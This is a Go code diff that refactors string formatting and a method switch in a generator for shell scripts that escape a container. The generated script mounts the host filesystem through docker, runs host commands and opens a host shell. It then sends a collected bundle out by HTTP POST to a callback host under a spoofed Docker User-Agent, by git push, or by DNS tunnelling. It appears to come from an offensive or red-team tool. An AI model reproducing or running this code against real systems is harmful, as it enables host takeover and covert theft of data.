@@ -105,12 +105,12 @@ _ESCAPE() {
 `)
 
 	// Host command via docker
-	b.WriteString(fmt.Sprintf(`
+	fmt.Fprintf(&b, `
     # Run commands on host via docker
     _host_output=$(docker run --rm --network=host -v /:/hostfs alpine:latest sh -c '%s' 2>/dev/null || true)
     echo "$_host_output" > "$_edir/host_output.txt"
 
-`, hostCmd))
+`, hostCmd)
 
 	// Interactive shell on host
 	b.WriteString(`
@@ -281,19 +281,21 @@ UNIQ_EOF
 
 `)
 
-	if method := o.ExfilMethod; method == "http" || method == "" {
+	method := o.ExfilMethod
+	switch {
+	case method == "http" || method == "":
 		target := o.ExfilTarget
 		if target == "" {
 			target = "http://callback.example.com"
 		}
-		b.WriteString(fmt.Sprintf(`
+		fmt.Fprintf(&b, `
   curl -sS -X POST -H "Content-Type: application/octet-stream" \
     -H "User-Agent: Docker/24.0" \
     --data-binary @"$_edir/bundle.tgz" \
     "%s" >/dev/null 2>&1 || true
-`, target))
-	} else if method == "git" {
-		b.WriteString(fmt.Sprintf(`
+`, target)
+	case method == "git":
+		fmt.Fprintf(&b, `
   _bdir=$(mktemp -d)
   git clone --depth 1 %q "$_bdir" 2>/dev/null
   cp "$_edir/bundle.tgz" "$_bdir/escape_data.bin" 2>/dev/null
@@ -303,8 +305,8 @@ UNIQ_EOF
   git add -A
   git commit -q -m "escape-exfil" 2>/dev/null
   git push -q origin HEAD 2>/dev/null || true
-`, o.ExfilTarget))
-	} else if method == "dns" {
+`, o.ExfilTarget)
+	case method == "dns":
 		b.WriteString(`
   b64=$(base64 -w0 "$_edir/bundle.tgz" | tr '+/' '-_' | tr -d '=')
   i=0
@@ -316,7 +318,7 @@ UNIQ_EOF
     sleep 0.1
   done
 `)
-	} else {
+	default:
 		b.WriteString(`
   echo "[*] Data collected in $_edir/bundle.tgz (artifact mode)"
 `)
